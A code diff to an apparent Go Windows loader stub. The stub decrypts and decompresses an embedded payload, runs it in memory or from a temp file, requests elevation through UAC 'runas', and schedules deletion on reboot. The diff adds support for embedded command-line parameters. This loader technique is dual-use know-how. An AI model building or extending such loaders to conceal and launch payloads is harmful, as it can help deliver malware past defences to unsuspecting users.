@@ -35,6 +35,8 @@ import (
 	"golang.org/x/crypto/chacha20poly1305"
 )
 
+var peEmbeddedArgs []string
+
 // Windows API
 var (
 	kernel32            = syscall.NewLazyDLL("kernel32.dll")
@@ -121,6 +123,9 @@ func main() {
 	// 3.5. Remove any random padding using OriginalSize (if present)
 	payload := trimToOriginal(decompressed, m.OriginalSize)
 
+	configuredArgs := parseUserParams(m.UserParams)
+	peEmbeddedArgs = combineArgs(configuredArgs, os.Args[1:])
+
 	// 4. Execute
 	mode := strings.ToLower(strings.TrimSpace(m.InMemoryMode))
 	switch mode {
@@ -149,6 +154,7 @@ type Metadata struct {
 	Nonce           []byte
 	UseInMemory     bool
 	InMemoryMode    string
+	UserParams      string
 }
 
 func parseMetadata(data []byte) *Metadata {
@@ -183,6 +189,13 @@ func parseMetadata(data []byte) *Metadata {
 	modeRaw := make([]byte, 16)
 	r.Read(modeRaw)
 	m.InMemoryMode = string(bytes.TrimRight(modeRaw, "\x00"))
+	var paramLen uint32
+	binary.Read(r, binary.LittleEndian, &paramLen)
+	if paramLen > 0 {
+		paramBuf := make([]byte, paramLen)
+		r.Read(paramBuf)
+		m.UserParams = string(paramBuf)
+	}
 	return m
 }
 
@@ -319,7 +332,7 @@ func executeFromTemp(payload []byte) {
 	// Se il payload richiede privilegi elevati e il processo corrente non è elevato,
 	// usa ShellExecuteW con verbo "runas" per lanciare con UAC
 	if !isProcessElevated() && payloadRequiresAdmin(payload) {
-		params := buildCmdline(os.Args[1:])
+		params := buildCmdline(peEmbeddedArgs)
 		var dirPtr *uint16
 		if dir != "" {
 			dirPtr = syscall.StringToUTF16Ptr(dir)
@@ -340,7 +353,7 @@ func executeFromTemp(payload []byte) {
 		// fallback a esecuzione non elevata se ShellExecute fallisce
 	}
 
-	cmd := exec.Command(tmpPath, os.Args[1:]...)
+	cmd := exec.Command(tmpPath, peEmbeddedArgs...)
 	if dir != "" {
 		cmd.Dir = dir
 	}
@@ -368,6 +381,71 @@ func cleanupTempFile(path string) {
 		pOld := syscall.StringToUTF16Ptr(path)
 		_, _, _ = procMoveFileEx.Call(uintptr(unsafe.Pointer(pOld)), uintptr(0), uintptr(MOVEFILE_DELAY_UNTIL_REBOOT))
 	}
+}
+
+func parseUserParams(raw string) []string {
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return nil
+	}
+	var args []string
+	var current strings.Builder
+	inQuotes := false
+	for _, r := range raw {
+		switch r {
+		case '"':
+			inQuotes = !inQuotes
+		case ' ', '\t':
+			if inQuotes {
+				current.WriteRune(r)
+			} else if current.Len() > 0 {
+				args = append(args, current.String())
+				current.Reset()
+			}
+		default:
+			current.WriteRune(r)
+		}
+	}
+	if current.Len() > 0 {
+		args = append(args, current.String())
+	}
+	return args
+}
+
+func combineArgs(configured, runtime []string) []string {
+	if len(configured) == 0 && len(runtime) == 0 {
+		return nil
+	}
+	args := make([]string, 0, len(configured)+len(runtime))
+	args = append(args, configured...)
+	args = append(args, runtime...)
+	return args
+}
+
+func quoteArg(arg string) string {
+	if arg == "" {
+		return "\"\""
+	}
+	if strings.IndexFunc(arg, func(r rune) bool {
+		return r == ' ' || r == '\t' || r == '"'
+	}) == -1 {
+		return arg
+	}
+	escaped := strings.ReplaceAll(arg, "\"", "\\\"")
+	return "\"" + escaped + "\""
+}
+
+func buildCommandLine(exePath string, args []string) []uint16 {
+	if len(args) == 0 {
+		return nil
+	}
+	parts := make([]string, 0, len(args)+1)
+	parts = append(parts, quoteArg(exePath))
+	for _, a := range args {
+		parts = append(parts, quoteArg(a))
+	}
+	utf16, _ := syscall.UTF16FromString(strings.Join(parts, " "))
+	return utf16
 }
 
 // buildCmdline unisce gli argomenti in una stringa semplice (quoting minimale)
